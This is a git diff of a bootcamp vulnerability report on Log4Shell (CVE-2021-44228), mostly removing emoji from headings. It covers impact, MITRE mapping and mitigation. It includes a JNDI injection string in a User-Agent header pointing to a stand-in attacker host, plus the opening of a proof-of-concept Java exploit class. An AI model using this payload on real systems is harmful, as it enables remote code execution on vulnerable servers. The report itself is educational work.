@@ -1,6 +1,6 @@
 # log4j-report
 A report for my bootcamp.
-📈 CVE-2021-44228 (Log4Shell) - Vulnerability Research Report
+CVE-2021-44228 (Log4Shell) - Vulnerability Research Report
 
 Author: Alex Breger
 Date: April 2025
@@ -8,7 +8,7 @@ Tags: Apache, Log4j, JNDI, LDAP, RCE, CVE, Exploit, MITRE ATT&CK
 
 ⸻
 
-🔍 Executive Summary
+Executive Summary
 	•	CVE: CVE-2021-44228
 	•	Discovered: December 2021
 	•	Affected Software: Apache Log4j2 (2.0-beta9 to 2.14.1)
@@ -20,7 +20,7 @@ The vulnerability known as Log4Shell resides in Apache Log4j2 and enables attack
 
 ⸻
 
-🔪 Technical Description
+Technical Description
 
 Nature of the Vulnerability
 
@@ -44,14 +44,14 @@ User-Agent: ${jndi:ldap://attacker.com/exploit}
 
 ⸻
 
-📈 Affected Systems
+Affected Systems
 	•	Log4j Versions: 2.0-beta9 through 2.14.1
 	•	Patched in: 2.15.0 (JNDI disabled by default), removed entirely in 2.16.0+
 	•	Vendors Impacted: Virtually all major Java-based software stacks (e.g., Apache, Minecraft, VMware, Elastic, AWS services, etc.)
 
 ⸻
 
-🔦 MITRE ATT&CK Mapping
+MITRE ATT&CK Mapping
 
 Tactic	Technique Description	ID
 Initial Access	Exploit Application Vulnerability	T1190
@@ -62,26 +62,26 @@ Command and Control	External Remote Service (LDAP/HTTP)	T1071.001
 
 ⸻
 
-⚖️ Impact
+Impact
 
-🚀 Remote Code Execution (RCE)
+Remote Code Execution (RCE)
 	•	Arbitrary attacker code is executed within the JVM of the vulnerable application
 
-🔐 Full System Compromise
+Full System Compromise
 	•	If the app runs as root or privileged service, full machine compromise is possible
 
-📈 Data Exfiltration
+Data Exfiltration
 	•	Access to sensitive logs, credentials, tokens, customer data
 
-🤧 Lateral Movement
+Lateral Movement
 	•	Compromised system may be used as a launchpad to pivot internally
 
-⛔ Denial of Service / Persistence
+Denial of Service / Persistence
 	•	Malware, ransomware, or persistent access can be established
 
 ⸻
 
-⚜️ Real-World Exploits & Responses
+Real-World Exploits & Responses
 	•	CISA: Issued emergency directive urging immediate patching across federal systems
 	•	SANS Institute: Documented exploitation in retail sector involving exfiltration and malware
 	•	GitHub: Reviewed 35,000+ dependencies and rapidly patched repositories
@@ -90,9 +90,9 @@ Command and Control	External Remote Service (LDAP/HTTP)	T1071.001
 
 ⸻
 
-🪜 Mitigation and Remediation
+Mitigation and Remediation
 
-✅ Recommended Actions
+Recommended Actions
 	1.	Upgrade Log4j2 to ≥ 2.16.0
 	2.	Remove JndiLookup class:
 
@@ -116,7 +116,7 @@ zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 ⸻
 
-📊 Case Studies
+Case Studies
 
 1. Retail Company (SANS)
 
@@ -138,11 +138,12 @@ For educational purposes only
 
 Step 1: Craft malicious Java class
 
-public class Exploit {
+```public class Exploit
+{
     static {
         Runtime.getRuntime().exec("touch /tmp/pwned");
     }
-}
+}```
 
 Step 2: Host class file over HTTP
 
